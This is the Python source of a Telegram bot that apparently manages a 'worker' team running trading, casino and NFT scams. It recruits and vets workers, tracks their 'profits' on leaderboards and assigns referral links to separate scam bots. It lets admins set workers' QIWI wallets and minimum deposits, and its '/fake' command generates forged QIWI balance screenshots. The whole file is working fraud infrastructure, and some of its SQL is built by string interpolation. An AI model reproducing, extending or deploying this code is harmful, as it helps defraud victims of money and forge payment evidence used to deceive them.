import asyncio
import sqlite3
import json
from environs import Env
from PIL import Image, ImageFont, ImageDraw
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message, ContentType
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
import scenes
import functions
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta

env = Env()
env.read_env()

NAME_TEAM = env.str('NAME_TEAM')
TOKEN_WORKER = env.str('TOKEN_WORKER')
BD_PATH = env.str('BD_PATH')
WORK_STATUS = env.str('WORK_STATUS')

USERNAME_WORKER_BOT = env.str('USERNAME_WORKER_BOT')

PATHS = env.str('PATHS')

TOKEN_TRADING = env.str('TOKEN_TRADING')
TOKEN_CASINO = env.str('TOKEN_CASINO')
PAGE_SIZE = 5

bot = Bot(TOKEN_WORKER, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Questionnaire(StatesGroup):
    time = State()
    exp = State()

class setMinDeposit(StatesGroup):
    setMessage_trading = State()
    setMessage_casino = State()

class changeQiwi(StatesGroup):
    ChangeQiwiTrading = State()
    ChangeQiwiCasino = State()

class newsletter(StatesGroup):
    message_newsletter = State()

class mamont_action(StatesGroup):
    changeBalance = State()

class Menu(StatesGroup):
    step = State()

print(f"{NAME_TEAM} | Worker: Воркер бот был запущен!")

@dp.message_handler(content_types=[ContentType.NEW_CHAT_MEMBERS])
async def new_members_handler(message: types.Message):
    new_member = message.new_chat_members[0]
    await bot.send_message(message.chat.id, f"👋 <b>Привет</b>, <a href='tg://user?id={new_member.id}'>{new_member.first_name} {new_member.last_name}</a> \n\n"
                                          f"🤖 <a href='https://t.me/{USERNAME_WORKER_BOT}'>Бот для работы</a> \n"
                                          f"📝 <a href='{env.str('LINK_MANUAL')}'>Мануалы для работы</a> \n"
                                          f"💸 <a href='{env.str('LINK_WITHDRAWS')}'>Канал выплат</a> \n\n"
                                          f"❗️Остальную информацию смотри в закрепе.")

@dp.message_handler(chat_type=['supergroup', 'group'], commands="work")
async def work(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        information = cursor.execute(f'SELECT * FROM information WHERE id = 1').fetchone()
    if int(information[2]) == 0 or int(information[3]) == 0:
        medium_profits = 0
    else:
        medium_profits = (int(information[3]) / int(information[2]))
    await message.answer(f"ℹ️ Информация о проекте <b>{NAME_TEAM}</b> \n\n"
                         f"📁 Количество профитов: <b>{information[2]}</b> шт. \n"
                         f"♻️ Общая сумма профитов: <b>{information[3]} ₽</b> \n"
                         f"└  Средний профит: <b>{medium_profits} ₽</b> \n\n"
                         f"🏴‍☠️ Состояние проекта: {await functions.workStatus(WORK_STATUS)}")

@dp.message_handler(chat_type=['supergroup', 'group'], commands="me")
async def work(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()

    if profile[5] != 0:
        sum_profits = f'<i>Сумма профитов: {profile[5]} ₽</i>'
    else:
        sum_profits = f'<i>Сумма профитов: У тебя ноль профитов</i>'

    if profile[5] == 0:
        count_profits = f'<i>Количество профитов: У тебя ноль профитов</i>'
    else:
        with sqlite3.connect(BD_PATH) as cursor:
            worker_count = cursor.execute(f"SELECT COUNT(id) FROM profits WHERE worker = ?", (message.from_user.id,)).fetchone()
        count_profits = f'<i>Количество профитов: {worker_count[0]}</i>'


    if profile[5] >= 50000 and profile[5] < 100000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 1 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 100000 and profile[5] < 200000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 2 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 200000 and profile[5] < 350000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 3 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 350000 and profile[5] < 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 4 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 5 WHERE id = ?', (message.from_user.id,))

    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()

    status = 'Ошибка получения статуса'
    status = await functions.getStatus(profile[4])
    current_date = datetime.now()
    days_passed = (current_date.date() - datetime.strptime(profile[7], "%d-%m-%Y").date()).days

    await message.answer_photo(open(f"{PATHS}/Worker/logo.jpg", 'rb'), f"💸 {sum_profits} \n"
                                                                       f"💸 {count_profits} \n\n"
                                                                       f"👨‍💻 <i>Статус: {status}</i> \n"
                                                                       f"🗓 <i>Количество дней в тимe: {days_passed}</i> \n\n")


@dp.message_handler(chat_type=['supergroup', 'group'], commands="top")
async def top(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        workers_top = cursor.execute(f"SELECT worker, SUM(amount) as 'count' FROM profits GROUP BY worker ORDER BY SUM(amount) DESC").fetchall()
        profits_all = cursor.execute(f"SELECT SUM(amount) FROM profits").fetchone()
    i = 1
    msg = 'Топ воркеров за всё время! \n'
    for worker_top in workers_top:

        with sqlite3.connect(BD_PATH) as cursor:
            worker_count = cursor.execute(f"SELECT COUNT(id) FROM profits WHERE worker = ?", (worker_top[0],)).fetchone()

        if i >= 10:
            return

        if i == 1:
            smile = '🥇'
        elif i == 2:
            smile = '🥈'
        elif i == 3:
            smile = '🥉'
        else:
            smile = '◾️'

        with sqlite3.connect(BD_PATH) as cursor:
            worker = cursor.execute(f"SELECT username, anonim FROM worker WHERE id = ?", (worker_top[0],)).fetchone()
        if (worker[1] != 1):
            username = f"<a href='tg://user?id={worker_top[0]}'>{worker[0][1:]}</a>"
        else:
            username = 'Аноним'
        msg += f"\n{smile} <b><u>{username}</u></b> : <b><i>{worker_top[1]}</i></b> ₽ - <b><i>{worker_count[0]}</i></b> профитов"
        i = i+1
    msg += f"\n\n♻️ Общая сумма профитов: {profits_all[0]} ₽"
    await message.answer(msg)

@dp.message_handler(chat_type=['supergroup', 'group'], commands="topd")
async def top(message: types.Message):
    current_time = datetime.now()
    with sqlite3.connect(BD_PATH) as cursor:
        workers_top = cursor.execute(f"SELECT worker, SUM(amount) as 'count' FROM profits WHERE date = ? GROUP BY worker ORDER BY SUM(amount) DESC", (current_time.strftime("%Y-%m-%d"),)).fetchall()
    i = 1
    msg = 'Топ воркеров за день! \n'
    for worker_top in workers_top:
        if i >= 10:
            return

        with sqlite3.connect(BD_PATH) as cursor:
            worker_count = cursor.execute(f"SELECT COUNT(id) FROM profits WHERE worker = ? AND date = ?", (worker_top[0],current_time.strftime("%Y-%m-%d"),)).fetchone()

        if i == 1:
            smile = '🥇'
        elif i == 2:
            smile = '🥈'
        elif i == 3:
            smile = '🥉'
        else:
            smile = '◾️'

        with sqlite3.connect(BD_PATH) as cursor:
            worker = cursor.execute(f"SELECT username, anonim FROM worker WHERE id = ?", (worker_top[0],)).fetchone()
        if (worker[1] != 1):
            username = f"<a href='tg://user?id={worker_top[0]}'>{worker[0][1:]}</a>"
        else:
            username = 'Аноним'

        msg += f"\n{smile} <b><u>{username}</u></b> : <b><i>{worker_top[1]}</i></b> ₽ - <b><i>{worker_count[0]}</i></b> профитов"
        i = i+1 
    await message.answer(msg)

@dp.message_handler(chat_type=['supergroup', 'group'], commands="topm")
async def top(message: types.Message):
    current_time = datetime.now()
    back_time = datetime.now() - relativedelta(months=1)
    with sqlite3.connect(BD_PATH) as cursor:
        workers_top = cursor.execute(f"SELECT worker, SUM(amount) as 'count' FROM profits WHERE date BETWEEN ? AND ? GROUP BY worker ORDER BY SUM(amount) DESC", (back_time.strftime("%Y-%m-%d"), current_time.strftime("%Y-%m-%d"),)).fetchall()
    i = 1
    msg = 'Топ воркеров за месяц! \n'
    for worker_top in workers_top:
        if i >= 10:
            return

        with sqlite3.connect(BD_PATH) as cursor:
            worker_count = cursor.execute(f"SELECT COUNT(id) FROM profits WHERE worker = ? AND date BETWEEN ? AND ?", (worker_top[0], back_time.strftime("%Y-%m-%d"), current_time.strftime("%Y-%m-%d"),)).fetchone()

        if i == 1:
            smile = '🥇'
        elif i == 2:
            smile = '🥈'
        elif i == 3:
            smile = '🥉'
        else:
            smile = '◾️'

        with sqlite3.connect(BD_PATH) as cursor:
            worker = cursor.execute(f"SELECT username, anonim FROM worker WHERE id = ?", (worker_top[0],)).fetchone()
        if (worker[1] != 1):
            username = f"<a href='tg://user?id={worker_top[0]}'>{worker[0][1:]}</a>"
        else:
            username = 'Аноним'
        msg += f"\n{smile} <b><u>{username}</u></b> : <b><i>{worker_top[1]}</i></b> ₽ - <b><i>{worker_count[0]}</i></b> профитов"
        i = i+1 
    await message.answer(msg)

@dp.message_handler(chat_type=['supergroup', 'group'], commands="rangs")
async def work(message: types.Message):
    await message.answer(f"<b>Система Рангов {NAME_TEAM}!</b> \n\n"
                         f"❗️Ранг выдается за общую сумму всех профитов \n"
                         f"❗️За достижение каждого ранга выдается роль в чате в соответствии с рангом \n"
                         f"❗️За достижение каждого ранга полагаются приятные плюшки от администрации - https://ссылкателеграмм \n\n"
                         f"5️⃣ Юнга - 50 000₽ \n\n"
                         f"4️⃣ Матрос - 100 000₽ \n\n"
                         f"🥉Корсар - 200 000₽ \n\n"
                         f"🥈Штурман - 350 000₽ \n\n"
                         f"🥇Капитан - 600 000₽")

@dp.message_handler(chat_type=['supergroup', 'group'], commands="fake")
async def fake(message: types.Message):
        partion = message.text.partition(' ')[2]
        text = partion.split(' ')[1] + ' ₽'
        qiwi = Image.open(f"{PATHS}/Worker/drawing/images/qiwi_balance.png")
        fnt = ImageFont.truetype(f"{PATHS}/Worker/drawing/fonts/Roboto-Bold.ttf", 100)
        timefnt = ImageFont.truetype(f"{PATHS}/Worker/drawing/fonts/SFUIText-BoldG1.otf", 45)
        w, h = fnt.getsize(text)
        d = ImageDraw.Draw(qiwi)
        d.text(((1080 - w) / 2, 266), text, font=fnt, fill=(255, 255, 255, 255))
        d.text((114, 42), partion.split(' ')[0], font=timefnt, fill=(0, 0, 0, 255))
        qiwi.save(f"{PATHS}/Worker/drawing/cache/{message.from_user.id}.png", "PNG")
        await message.answer_photo(open(f"{PATHS}/Worker/drawing/cache/{message.from_user.id}.png", 'rb'), f"Ваш скриншот за запросом: \nВремя: <b>{partion.split(' ')[0]}</b> \nСумма: <b>{text}</b>")

@dp.message_handler(chat_type='supergroup', commands="mute", is_chat_admin=True)
async def mute(message: types.Message):
    if not message.reply_to_message:
        await message.reply("❌ <b>Команда мута должна быть ответом на сообщение пользователя!</b>")
        return
    try:
        muteint = int(message.text.split()[1])
        mutetype = message.text.split()[2]
        comment = " ".join(message.text.split()[3:])
    except IndexError:
        await message.reply(f"❌ <b>Не хватает аргументов к команде! \n"
                            f"Пример:"
                            f"<b>`/mute 1 ч причина`</b>")
        return
    if mutetype == "ч" or mutetype == "часов" or mutetype == "час" or mutetype == "часа":
        datetimes = datetime.now() + timedelta(hours=muteint)
        timestamp = datetimes.timestamp()
        await bot.restrict_chat_member(message.chat.id, message.reply_to_message.from_user.id, types.ChatPermissions(False), until_date = timestamp)
        await message.reply(f"<b>Был выдан мут пользователю:</b>\n"
                            f"<b>Пользователь кому выдан мут:</b> <a href='tg://user?id={message.reply_to_message.from_user.id}'>{message.reply_to_message.from_user.full_name}</a>\n"
                            f"<b>Наказание:</b> {muteint} {mutetype}\n"
                            f"<b>Причина:</b> {comment}")
    elif mutetype == "м" or mutetype == "минут" or mutetype == "минута" or mutetype == "минуты":
        datetimes = datetime.now() + timedelta(minutes=muteint)
        timestamp = datetimes.timestamp()
        await bot.restrict_chat_member(message.chat.id, message.reply_to_message.from_user.id, types.ChatPermissions(False), until_date = timestamp)
        await message.reply(f"<b>Был выдан мут пользователю:</b>\n"
                            f"<b>Пользователь кому выдан мут:</b> <a href='tg://user?id={message.reply_to_message.from_user.id}''>{message.reply_to_message.from_user.full_name}</a>\n"
                            f"<b>Наказание:</b> {muteint} {mutetype}\n"
                            f"<b>Причина:</b> {comment}")
    elif mutetype == "д" or mutetype == "дней" or mutetype == "день" or mutetype == "дня":
        datetimes = datetime.now() + timedelta(days=muteint)
        timestamp = datetimes.timestamp()
        await bot.restrict_chat_member(message.chat.id, message.reply_to_message.from_user.id, types.ChatPermissions(False), until_date = timestamp)
        await message.reply(f"<b>Был выдан мут пользователю:</b>\n"
                            f"<b>Пользователь кому выдан мут:</b> <a href='tg://user?id={message.reply_to_message.from_user.id}'>{message.reply_to_message.from_user.full_name}</a>\n"
                            f"<b>Наказание:</b> {muteint} {mutetype}\n"
                            f"<b>Причина:</b> {comment}")

@dp.message_handler(chat_type='supergroup', commands="unmute", is_chat_admin=True)
async def unmute(message: types.Message):
    if not message.reply_to_message:
        await message.reply("❌ <b>Команда мута должна быть ответом на сообщение пользователя!</b>")
        return
    else:
        await bot.restrict_chat_member(message.chat.id, message.reply_to_message.from_user.id, types.ChatPermissions(True))
        await message.reply("✅ Пользователь был размучен")

@dp.message_handler(chat_type='private', commands="start", state="*")
async def start(message: types.Message, state: FSMContext):
    try:
        with sqlite3.connect(BD_PATH) as cursor:
            questionnaire = cursor.execute("SELECT id FROM worker WHERE id = ?", (message.from_user.id,)).fetchone()
        if questionnaire is None:
            await message.answer(f"Тебя приветствует <b>{NAME_TEAM}</b>! \n\n"
                                 f"☠️ Правила нашего проекта: \n"
                                 f"• <b>Запрещено попрошайничество</b> \n"
                                 f"• <b>Запрещен: спам/флуд/шок/порно контент</b> \n"
                                 f"• <b>Запрещается продажа каких либо услуг/товаров без соглашения администрации</b>. \n"
                                 f"• <b>За сделки проведённые без нашего ведома ответственности НЕ НЕСЁМ</b> \n"
                                 f"• <b>Запрещено принимать оплату на свои реквизиты</b> \n"
                                 f"• <b>Разрешено - рофлить над всеми, не зависимо от статуса участника проекта (в пределах нормы)</b> \n"
                                 f"• <b>Локи выплачиваются по усмотрению ТСа</b>. \n"
                                 f"Незнание правил не освобождает от ответственности!", reply_markup=scenes.agree)
        else:
            admins = []
            for admin in env.list('ADMIN_ID'):
                admins.append(int(admin))
            if message.from_user.id in admins:
                await message.answer("Нажимай кнопки снизу!", reply_markup=scenes.main_admin)
            else:
                await message.answer("Нажимай кнопки снизу!", reply_markup=scenes.main)
                
    except:
        print(f"{NAME_TEAM} | Worker: У Воркер бота возникла ошибка во время выполнения хендлера! Известные данные:")
        print(f"{NAME_TEAM} | Worker: {message.from_user.username} | {message.from_user.id} - {message.text}")
 
@dp.callback_query_handler(text='rules')
async def questionnaire(call: CallbackQuery):
    await call.answer("Небольшая анкета")
    await call.message.answer("⏳Сколько часов в день ты готов тратить на работу в нашей команде?")
    await Questionnaire.time.set()

@dp.message_handler(state=Questionnaire.time)
async def answer_time(message: types.Message, state: FSMContext):
    await state.update_data(time=message.text)
    await message.answer("🏴‍☠️ Есть ли у тебя опыт работы в сфере Trade/Casino/NFT скама?")
    await Questionnaire.next()

@dp.message_handler(state=Questionnaire.exp)
async def answer_time(message: types.Message, state: FSMContext):
    await state.update_data(exp=message.text)
    data = await state.get_data()
    username = message.from_user.first_name
    if message.from_user.username:
        username = f"@{message.from_user.username}"
    ADMIN_ID = env.list('ADMIN_ID')
    for admin in ADMIN_ID:
        await bot.send_message(admin, f"<b>Заявка {username}</b> \n"
                                      f"Telegram ID: <b>{message.from_user.id}</b>\n"
                                      f"• Время: <b>{data.get('time')}</b>\n"
                                      f"• Опыт: <b>{data.get('exp')}</b>",reply_markup=scenes.admin_solution(username, message.from_user.id))
    await message.answer("Анкета успешно заполнена, ожидай ответ!")
    await state.finish()

@dp.callback_query_handler(scenes.UserInfoCallback.filter(status = 'Accept'))
async def accept_form(call: CallbackQuery, callback_data: dict):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute('SELECT * FROM worker WHERE id = ?', (callback_data.get('user_id'),)).fetchone()
    if user is None:
        current_time = datetime.now()
        await call.bot.edit_message_text(f"Вы приняли заявку {callback_data.get('username')}", call.message.chat.id, call.message.message_id)
        await call.bot.send_message(callback_data.get("user_id"), f'✅Ты принят в {NAME_TEAM}!' ,reply_markup=scenes.links)
        await call.bot.send_message(callback_data.get("user_id"), 'Воспользуйся кнопками ниже', reply_markup=scenes.main)
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('INSERT INTO worker VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', (callback_data.get('user_id'), callback_data.get('username'), await functions.getNumberRand(), 1000, 0, 0, None, current_time.strftime("%d-%m-%Y"), 1000, 0, 0))
    else:
        await call.bot.edit_message_text(f"Заявка {callback_data.get('username')} была обработана другим администратором!", call.message.chat.id, call.message.message_id)

@dp.callback_query_handler(scenes.UserInfoCallback.filter(status = 'Decline'))
async def decline_form(call: CallbackQuery, callback_data: dict):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute('SELECT * FROM worker WHERE id = ?', (callback_data.get('user_id'),)).fetchone()
    if user is None:
        await call.bot.edit_message_text(f"Вы отказали {callback_data.get('username')}", call.message.chat.id, call.message.message_id)
        await call.bot.send_message(callback_data.get("user_id"), "❌ Твою заявку отклонили.")
    else:
        await call.bot.edit_message_text(f"Заявка {callback_data.get('username')} была обработана другим администратором!", call.message.chat.id, call.message.message_id)

@dp.message_handler(chat_type='private', content_types=['text'], text='💻 Мой профиль')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()

    if profile[5] != 0:
        sum_profits = f'<i>Сумма профитов: {profile[5]} ₽</i>'
    else:
        sum_profits = f'<i>Сумма профитов: У тебя ноль профитов</i>'

    if profile[5] == 0:
        count_profits = f'<i>Количество профитов: У тебя ноль профитов</i>'
    else:
        with sqlite3.connect(BD_PATH) as cursor:
            worker_count = cursor.execute(f"SELECT COUNT(id) FROM profits WHERE worker = ?", (message.from_user.id,)).fetchone()
        count_profits = f'<i>Количество профитов: {worker_count[0]}</i>'

    if profile[5] < 50000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 0 WHERE id = ?', (message.from_user.id,)) 
    elif profile[5] >= 50000 and profile[5] < 100000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 1 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 100000 and profile[5] < 200000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 2 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 200000 and profile[5] < 350000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 3 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 350000 and profile[5] < 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 4 WHERE id = ?', (message.from_user.id,))
    elif profile[5] >= 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 5 WHERE id = ?', (message.from_user.id,))

    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()

    status = 'Ошибка получения статуса'
    status = await functions.getStatus(profile[4])
    current_date = datetime.now()
    days_passed = (current_date.date() - datetime.strptime(profile[7], "%d-%m-%Y").date()).days

    if profile[10] == 0:
        change_anonim = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="⚙️ Cкрыть никнейм", callback_data=f"change_anonim,{profile[0]},hide")
                ]
            ]
        )
    else:
        change_anonim = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="⚙️ Показать никнейм", callback_data=f"change_anonim,{profile[0]},show")
                ]
            ]
        )

    await message.answer_photo(open(f"{PATHS}/Worker/logo.jpg", 'rb'), f"🔒 <b>Реферальный код: {profile[6]}</b> \n\n"
                                                                       f"💸 {sum_profits} \n"
                                                                       f"💸 {count_profits} \n\n"
                                                                       f"👨‍💻 <i>Статус: {status}</i> \n"
                                                                       f"🗓 <i>Количество дней в тимe: {days_passed}</i> \n\n"
                                                                       f"🏴‍☠️ Состояние проекта: <b>{await functions.workStatus(WORK_STATUS)}</b>", reply_markup=change_anonim)

@dp.callback_query_handler(text_startswith='change_anonim')
async def changeAnonim(call: CallbackQuery):
    id,types = call.data.split(',')[1],call.data.split(',')[2]

    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {call.from_user.id}').fetchone()

    if profile[5] != 0:
        count_profits = f'<i>Профитов: {profile[5]} ₽</i>'
    else:
        count_profits = f'<i>У тебя ноль профитов</i>'

    if profile[5] >= 50000 and profile[5] < 100000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 1 WHERE id = ?', (call.from_user.id,))
    elif profile[5] >= 100000 and profile[5] < 200000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 2 WHERE id = ?', (call.from_user.id,))
    elif profile[5] >= 200000 and profile[5] < 350000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 3 WHERE id = ?', (call.from_user.id,))
    elif profile[5] >= 350000 and profile[5] < 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 4 WHERE id = ?', (call.from_user.id,))
    elif profile[5] >= 600000:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET status = 5 WHERE id = ?', (call.from_user.id,))

    status = 'Ошибка получения статуса'
    status = await functions.getStatus(profile[4])
    current_date = datetime.now()
    days_passed = (current_date.date() - datetime.strptime(profile[7], "%d-%m-%Y").date()).days

    if types == 'show':
        change_anonim = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="⚙️ Cкрыть никнейм", callback_data=f"change_anonim,{profile[0]},hide")
                ]
            ]
        )

        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET anonim = 0 WHERE id = ?', (call.from_user.id,))
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)

        await call.message.answer_photo(open(f"{PATHS}/Worker/logo.jpg", 'rb'), f"🔒 <b>Реферальный код: {profile[6]}</b> \n\n"
                                                                       f"💸 {count_profits} \n\n"
                                                                       f"👨‍💻 <i>Статус: {status}</i> \n"
                                                                       f"🗓 <i>Количество дней в тимe: {days_passed}</i> \n\n"
                                                                       f"🏴‍☠️ Состояние проекта: <b>{await functions.workStatus(WORK_STATUS)}</b>", reply_markup=change_anonim)
    if types == 'hide':
        change_anonim = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="⚙️ Показать никнейм", callback_data=f"change_anonim,{profile[0]},show")
                ]
            ]
        )

        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute(f'UPDATE worker SET anonim = 1 WHERE id = ?', (call.from_user.id,))
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)

        await call.message.answer_photo(open(f"{PATHS}/Worker/logo.jpg", 'rb'), f"🔒 <b>Реферальный код: {profile[6]}</b> \n\n"
                                                                       f"💸 {count_profits} \n\n"
                                                                       f"👨‍💻 <i>Статус: {status}</i> \n"
                                                                       f"🗓 <i>Количество дней в тимe: {days_passed}</i> \n\n"
                                                                       f"🏴‍☠️ Состояние проекта: <b>{await functions.workStatus(WORK_STATUS)}</b>", reply_markup=change_anonim)

@dp.callback_query_handler(text='setMinDeposit_trading')
async def setDeposit(call: CallbackQuery):
    await call.message.answer("Введите вашу минималку")
    await setMinDeposit.setMessage_trading.set()

@dp.message_handler(state=setMinDeposit.setMessage_trading)
async def setMinDep(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()
    await state.update_data(curDep=profile[3])
    await state.update_data(minDep=message.text)
    data = await state.get_data()
    minDep = data.get('minDep')
    curDep = data.get('curDep')
    if not minDep.isnumeric():
        await message.answer("Отменено")
        await state.finish()
    elif minDep.isnumeric():
        MIN_DEPOSIT = int(env.int('MIN_DEPOSIT'))
        MAX_DEPOSIT = int(env.int('MAX_DEPOSIT'))
        if int(minDep) < MIN_DEPOSIT:
            await message.answer("Ты не можешь указывать минималку меньше, чем стандартная!")
            await setMinDeposit.setMessage_trading.set()
            await message.answer("Введите вашу минималку")
        elif int(minDep) > MAX_DEPOSIT:
            await message.answer(f"Слишком высокая минималка! \n"
                                 f"Максимально доступная - <b>{MAX_DEPOSIT}</b>")
            await setMinDeposit.setMessage_trading.set()
            await message.answer("Введите вашу минималку")
        elif int(minDep) % 10 != 0:
            await message.answer(f"{minDep} - неправильно \n"
                                 f"1000, 1100, 1200 - правильно")
        elif int(minDep) >= MIN_DEPOSIT and int(minDep) <= MAX_DEPOSIT:
            await message.answer(f"Твоя минималка: {curDep}\n"
                                 f"Новая минималка: {minDep}")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute('UPDATE worker SET min_deposit_trading = ? WHERE id = ?',(minDep, message.from_user.id,))
            await state.finish()

@dp.callback_query_handler(text='setMinDeposit_casino')
async def setDeposit(call: CallbackQuery):
    await call.message.answer("Введите вашу минималку")
    await setMinDeposit.setMessage_casino.set()

@dp.message_handler(state=setMinDeposit.setMessage_casino)
async def setMinDep(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()
    await state.update_data(curDep=profile[8])
    await state.update_data(minDep=message.text)
    data = await state.get_data()
    minDep = data.get('minDep')
    curDep = data.get('curDep')
    if not minDep.isnumeric():
        await message.answer("Отменено")
        await state.finish()
    elif minDep.isnumeric():
        MIN_DEPOSIT = int(env.int('MIN_DEPOSIT'))
        MAX_DEPOSIT = int(env.int('MAX_DEPOSIT'))
        if int(minDep) < MIN_DEPOSIT:
            await message.answer("Ты не можешь указывать минималку меньше, чем стандартная!")
            await setMinDeposit.setMessage_casino.set()
            await message.answer("Введите вашу минималку")
        elif int(minDep) > MAX_DEPOSIT:
            await message.answer(f"Слишком высокая минималка! \n"
                                 f"Максимально доступная - <b>{MAX_DEPOSIT}</b>")
            await setMinDeposit.setMessage_casino.set()
            await message.answer("Введите вашу минималку")
        elif int(minDep) % 10 != 0:
            await message.answer(f"{minDep} - неправильно \n"
                                 f"1000, 1100, 1200 - правильно")
        elif int(minDep) >= MIN_DEPOSIT and int(minDep) <= MAX_DEPOSIT:
            await message.answer(f"Твоя минималка: {curDep}\n"
                                 f"Новая минималка: {minDep}")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute('UPDATE worker SET min_deposit_casino = ? WHERE id = ?',(minDep, message.from_user.id,))
            await state.finish()

@dp.message_handler(chat_type='private', content_types=['text'], text='📈 Трейдинг')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()
    USERNAME_TRADING_BOT = env.str('USERNAME_TRADING_BOT')
    await message.answer(f"📋 Твой код: <code>{profile[6]}</code> \n\n"
                         f"📞 Твой номер: <code>+{profile[2]}</code> \n"
                         f"🔗 Ссылка: https://t.me/{USERNAME_TRADING_BOT}?start={profile[6]} \n"
                         f"⛓ Cекретная ссылка: <a href='https://t.me/{USERNAME_TRADING_BOT}?start={profile[6]}'>@{USERNAME_TRADING_BOT}</a>", reply_markup=scenes.trading_users)

@dp.message_handler(chat_type='private', content_types=['text'], text='🎰 Казино')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM worker WHERE id = {message.from_user.id}').fetchone()
    USERNAME_CASINO_BOT = env.str('USERNAME_CASINO_BOT')
    await message.answer(f"📋 Твой код: <code>{profile[6]}</code> \n\n"
                         f"📞 Твой номер: <code>+{profile[2]}</code> \n"
                         f"🔗 Ссылка: https://t.me/{USERNAME_CASINO_BOT}?start={profile[6]} \n"
                         f"⛓ Cекретная ссылка: <a href='https://t.me/{USERNAME_CASINO_BOT}?start={profile[6]}'>@{USERNAME_CASINO_BOT}</a>", reply_markup=scenes.casino_users)

@dp.message_handler(chat_type='private', content_types=['text'], text='🗃 О проекте')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        information = cursor.execute(f'SELECT * FROM information WHERE id = 1').fetchone()
    if int(information[2]) == 0 or int(information[3]) == 0:
        medium_profits = 0
    else:
        medium_profits = (int(information[3]) / int(information[2]))
    await message.answer(f"ℹ️ Информация о проекте <b>{NAME_TEAM}</b> \n\n"
                         f"🏁 Мы открылись: {information[1]} \n"
                         f"📁 Количество профитов: <b>{information[2]}</b> шт. \n"
                         f"♻️ Общая сумма профитов: <b>{information[3]} ₽</b> \n"
                         f"└  Средний профит: <b>{medium_profits} ₽</b> \n\n"
                         f"🔹 Проценты: \n"
                         f"├ Платёж X1 - 80% \n"
                         f"├ Платёж X2/X3/X4/ТП - 70% \n"
                         f"└ Проблемный платёж: 50% \n\n"
                         f"🏴‍☠️ Состояние проекта: <b>{await functions.workStatus(WORK_STATUS)}</b>", reply_markup=scenes.links)

